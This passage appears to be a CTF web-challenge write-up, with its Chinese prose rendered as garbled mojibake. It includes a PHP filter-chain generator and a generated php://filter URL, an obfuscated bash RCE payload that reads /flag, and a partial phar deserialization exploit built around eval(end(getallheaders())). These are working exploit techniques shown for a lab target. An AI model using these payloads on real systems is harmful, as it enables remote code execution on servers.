class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;M&#x27;</span>:<span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span>:<span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Q&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;+&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_filter_chain</span>(<span class="params">chain, debug_base64 = <span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    encoded_chain = chain</span><br><span class="line">    <span class="comment"># generate some garbage base64</span></span><br><span class="line">    filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">    filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">    <span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">    filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> encoded_chain[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug_base64:</span><br><span class="line">        <span class="comment"># don&#x27;t add the decode while debugging chains</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">    final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> final_payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Parsing command line arguments</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;PHP filter chain generator.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&quot;--chain&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Content you want to generate. (you will maybe need to pad with spaces for your payload to work)&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--rawbase64&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.chain <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        chain = args.chain.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        base64_value = base64.b64encode(chain).decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        chain = generate_filter_chain(base64_value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] The following gadget chain will generate the following code : &#123;&#125; (base64 value: &#123;&#125;)&quot;</span>.<span class="built_in">format</span>(args.chain, base64_value))</span><br><span class="line">        <span class="built_in">print</span>(chain)</span><br><span class="line">    <span class="keyword">if</span> args.rawbase64 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        rawbase64 = args.rawbase64.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">&quot;^([A-Za-z0-9+/])*$&quot;</span>, rawbase64)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">match</span>):</span><br><span class="line">            chain = generate_filter_chain(rawbase64, <span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(chain)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[-] Base64 string required.&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 php_filter_chain_generator.py --chain Vm1wQ1lXTXhTa2RYYTFwWVZWRQ</span><br><span class="line"></span><br><span class="line">http://172.17.0.2/what&#x27;s_this.php?p=convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode</span><br></pre></td></tr></table></figure>
<p>åæ­£å¤šå¥—å‡ å±‚base64è‚¯å®šèƒ½å‡ºï¼Œå®åœ¨ä¸è¡Œå°±ä»XYCTFä¸€æ­¥æ­¥å¥—ä¸Šå»</p>
<h1><span id="ezrce"> ezrce</span></h1>
<p>åŸç†å’ŒCTFShowæé™rceä¸€è‡´ï¼Œæ¢å§¬å¸ˆå‚…æœ‰ä¸ªè„šæœ¬ï¼Œä¸€æŠŠæ¢­äº†â€¦</p>
<p>å¹¶ä¸ï¼ˆ</p>
<p>è®°å¾—åŠ bashçš„ç¬¦å·å°±å¯ä»¥äº†</p>
<p>payloadï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;<span class="variable">$0</span>\&lt;\&lt;\&lt;\$\<span class="string">&#x27;\\173\\143\\141\\164\\54\\57\\146\\154\\141\\147\\175\\174\\142\\141\\163\\145\\66\\64\&#x27;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">&#123;<span class="built_in">cat</span>,/flag&#125;|<span class="built_in">base64</span></span></span><br></pre></td></tr></table></figure>
<p>å»base64è§£ç </p>
<h1><span id="pharme"> pharme</span></h1>
<p>æµ‹è¯•å¯å¾—å…è®¸ä¸Šä¼ çš„åç¼€ä¸ºjpg</p>
<p>class.phpæ˜¯ä¸€ä¸ªç®€å•çš„æ— å‚RCEï¼Œåˆ©ç”¨<code>__HALT_COMPILER();</code>ç»ˆæ­¢ç¼–è¯‘å³å¯</p>
<p>expï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;eval(end(getallheaders()));__halt_compiler();&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;ezxy.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="comment">//è®¾ç½®stub å¢åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line">    <span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); <span class="comment">//æ·»åŠ 